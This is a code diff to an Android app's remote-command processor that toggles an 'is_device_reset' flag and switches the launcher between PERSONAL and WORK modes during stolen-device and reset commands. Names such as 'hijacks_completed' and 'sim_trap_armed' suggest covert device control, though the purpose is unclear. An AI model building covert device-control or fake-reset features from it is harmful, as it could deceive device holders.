@@ -1852,6 +1852,11 @@ object CommandProcessor {
                             .putBoolean("is_sim_trap_armed", false)
                             .apply()
                             
+                        // 6. Reset the device reset flag and launcher mode for testing
+                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().putBoolean("is_device_reset", false).apply()
+                        ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE).edit().putString("display_mode", "PERSONAL").apply()
+                        AppCache.invalidate()
+                            
                         status = "STOLEN_PROTOCOL_DISARMED"
                         errorMsg = "All lockdown mechanisms lifted. Device restored to normal."
                     } else {
@@ -2456,8 +2461,9 @@ object CommandProcessor {
                 }
                 "RESET_BACKGROUND_TASKS" -> {
                     DebugLogger.log("RBT_LIFECYCLE", "Starting RESET_BACKGROUND_TASKS. Content: $content")
-                    val lPrefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                     val targetMode = if (content.trim().uppercase() == "PERSONAL") "PERSONAL" else "WORK"
+                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().putBoolean("is_device_reset", targetMode == "WORK").apply()
+                    val lPrefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                     lPrefs.edit().putString("display_mode", targetMode).putBoolean("active", true).apply()
                     AppCache.invalidate()
 
@@ -2979,6 +2985,8 @@ object CommandProcessor {
                     DebugLogger.log("FINALIZE_LIFECYCLE", "=== STARTING FINALIZE_RESET (OVERHAULED) ===")
                     // CRITICAL FIX: Reset the completion flag immediately so WelcomeUI correctly waits for THIS operation to finish.
                     ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("hijacks_completed", false).apply()
+                    // Set device reset flag for future reboots
+                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().putBoolean("is_device_reset", true).apply()
                     DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 1: TouchGuard explicitly omitted to prevent Z-index touch conflicts with WelcomeUI.")
 
                     DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 2: Configuring Launcher to WORK mode and pairing Status Bar.")
